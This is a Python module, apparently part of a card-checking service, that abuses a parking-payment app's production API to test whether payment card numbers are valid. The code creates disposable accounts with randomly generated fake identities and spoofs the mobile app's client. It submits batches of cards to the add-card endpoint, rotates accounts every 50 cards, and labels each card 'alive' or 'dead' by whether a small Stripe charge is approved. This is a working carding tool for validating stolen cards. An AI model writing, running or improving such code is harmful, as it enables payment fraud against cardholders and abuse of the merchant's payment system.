import asyncio
import re
import random
import string
import threading

from primp import AsyncClient

# ══════════════════════════════════════
# CONFIG
# ══════════════════════════════════════
NAME = 'Parking Gate'
COST = '3 credits / live'

BASE = 'https://parkingpay-api-prod.azurewebsites.net'
ACCOUNT_LIFETIME = 50
TIMEOUT = 20

COMMON_HEADERS = {
    'user-agent': 'Dart/2.18 (dart:io)',
    'content-type': 'application/json; charset=utf-8',
    'accept-encoding': 'gzip',
    'host': 'parkingpay-api-prod.azurewebsites.net',
}

_state_lock = threading.Lock()
_account = None
_cards_used = 0

print('[parking_gate] Loading... (AsyncClient, no proxy)')

def _random_identity():
    first = ''.join(random.choices(string.ascii_lowercase, k=6)).title()
    last = ''.join(random.choices(string.ascii_lowercase, k=7)).title()
    return {
        'first_name': first,
        'last_name': last,
        'email': first.lower() + last.lower() + str(random.randint(100000, 999999)) + '@gmail.com',
        'phone': str(random.randint(1000000000, 9999999999)),
        'password': first.lower() + last.lower() + str(random.randint(1000, 9999)) + '.',
    }

def _parse_cc(raw):
    parts = re.split(r'[|/\s]+', raw.strip())
    parts = [p for p in parts if p]
    if len(parts) < 4:
        raise ValueError('Invalid card format')
    number = re.sub(r'\D', '', parts[0])
    if not (13 <= len(number) <= 19):
        raise ValueError('Invalid PAN')
    mm = parts[1].zfill(2)
    yy = parts[2]
    if len(yy) == 2:
        yy = '20' + yy
    cvv = parts[3]
    return {'number': number, 'exp_month': mm, 'exp_year': yy, 'cvv': cvv}

def _gate_off(r):
    return (
        r.status_code == 403
        or 'web app is stopped' in r.text.lower()
        or 'Web App - Unavailable' in r.text
    )

async def _create_account_async():
    identity = _random_identity()
    client = AsyncClient(timeout=TIMEOUT, verify=True)

    print('[parking_gate] Creating account: ' + identity['email'])
    try:
        r = await client.post(
            BASE + '/api/app/usuarios/registro',
            json={
                'correoElectronico': identity['email'],
                'nombre': identity['first_name'],
                'apellidos': identity['last_name'],
                'telefono': identity['phone'],
                'contrasena': identity['password'],
            },
            headers=COMMON_HEADERS,
        )
        if _gate_off(r):
            raise ValueError('Gate is OFF')
        if r.status_code != 200:
            raise ValueError('Register failed HTTP ' + str(r.status_code))

        r = await client.post(
            BASE + '/api/auth',
            json={
                'correoElectronico': identity['email'],
                'contrasena': identity['password'],
            },
            headers=COMMON_HEADERS,
        )
        if _gate_off(r):
            raise ValueError('Gate is OFF')
        if r.status_code != 200:
            raise ValueError('Login failed HTTP ' + str(r.status_code))

        auth = r.json()
        token = auth.get('token')
        if not token:
            raise ValueError('No token in response')
        print('[parking_gate] Account ready!')
        return {'client': client, 'token': token, 'email': identity['email']}
    except ValueError:
        raise
    except Exception as e:
        name = type(e).__name__
        if 'Timeout' in name:
            raise ValueError('TIMEOUT after ' + str(TIMEOUT) + 's')
        raise ValueError(name + ': ' + str(e)[:100])

async def _check_card_with_retry(acc, card, retries=3):
    headers = dict(COMMON_HEADERS)
    headers['authorization'] = acc['token']
    
    for attempt in range(retries):
        try:
            r = await acc['client'].post(
                BASE + '/api/app/conductor/tarjetas',
                json={
                    'numero': card['number'],
                    'expiracionMes': card['exp_month'],
                    'expiracionYear': card['exp_year'],
                },
                headers=headers,
            )
        except Exception as e:
            name = type(e).__name__
            if 'Timeout' in name:
                if attempt < retries - 1:
                    await asyncio.sleep(2)
                    continue
                return {'status': 'error', 'message': 'Timeout'}
            return {'status': 'error', 'message': name + ': ' + str(e)[:80]}

        body = r.text
        if _gate_off(r):
            return {'status': 'error', 'message': 'Gate is OFF'}
        if r.status_code == 401 or 'no autorizado' in body.lower():
            return {'status': 'error', 'message': 'Token expired', 'reset': True}
        
        if r.status_code in (429, 503) or (r.status_code == 500 and not body.strip()):
            if attempt < retries - 1:
                await asyncio.sleep(2)
                continue
            return {'status': 'error', 'message': 'Endpoint saturated'}
            
        if 'fingerprint' in body:
            return {'status': 'success', 'message': 'Charge $1 MXN Approved'}
            
        if 'error al crear la tarjeta en stripe' in body.lower():
            try:
                j = r.json()
                msg = j.get('message', '') or j.get('error', '') or 'Declined'
            except Exception:
                msg = 'Declined by Stripe'
            return {'status': 'declined', 'message': str(msg)[:120]}
            
        try:
            j = r.json()
            msg = (j.get('message', '') or j.get('error', '') or str(j)[:120]) if isinstance(j, dict) else str(j)[:120]
        except Exception:
            msg = body[:120]
        return {'status': 'declined', 'message': msg}
    
    return {'status': 'error', 'message': 'Max retries reached'}

def _reset_account():
    global _account, _cards_used
    with _state_lock:
        if _account and _account.get('client'):
            try:
                asyncio.run(_account['client'].aclose())
            except Exception:
                pass
        _account = None
        _cards_used = 0

def _run_async(coro):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(coro)
        finally:
            loop.close()
    finally:
        asyncio.set_event_loop(None)

def _get_account():
    global _account, _cards_used
    with _state_lock:
        if _account is None or _cards_used >= ACCOUNT_LIFETIME:
            _account = _run_async(_create_account_async())
            _cards_used = 0
        return _account

def _format_result(url, result):
    status = result.get('status')
    if status == 'success':
        return {'url': url, 'status': 'alive', 'redirects_to': result.get('message', 'Approved'),
                'response_time_ms': None, 'error': None}
    elif status == 'declined':
        return {'url': url, 'status': 'dead', 'redirects_to': None,
                'response_time_ms': None, 'error': result.get('message', 'Declined')}
    else:
        return {'url': url, 'status': 'error', 'redirects_to': None,
                'response_time_ms': None, 'error': result.get('message', 'Error')}

def check(url):
    return check_batch([url])[0]

def check_batch(urls):
    global _cards_used
    if not urls:
        return []

    try:
        acc = _get_account()
    except Exception as e:
        err = str(e)[:150]
        print('[parking_gate] Account FAILED: ' + err)
        return [{'url': u, 'status': 'error', 'redirects_to': None,
                 'response_time_ms': None, 'error': err} for u in urls]

    async def _run_all():
        tasks = []
        for u in urls:
            card = _parse_cc_safe(u)
            if card:
                tasks.append(_check_card_with_retry(acc, card))
            else:
                async def _invalid(): return {'status': 'error', 'message': 'Invalid card format'}
                tasks.append(_invalid())
        return await asyncio.gather(*tasks)

    def _parse_cc_safe(u):
        try:
            return _parse_cc(u)
        except ValueError:
            return None

    try:
        raw_results = _run_async(_run_all())
    except Exception as e:
        raw_results = [e] * len(urls)

    results = []
    for u, r in zip(urls, raw_results):
        if isinstance(r, Exception):
            results.append({'url': u, 'status': 'error', 'redirects_to': None,
                            'response_time_ms': None, 'error': str(r)[:150]})
            continue
        if r is None:
            results.append({'url': u, 'status': 'error', 'redirects_to': None,
                            'response_time_ms': None, 'error': 'Invalid card format'})
            continue
        if r.get('reset'):
            _reset_account()
        results.append(_format_result(u, r))

    with _state_lock:
        _cards_used += len(urls)

    return results

def get_proxy_count():
    return 0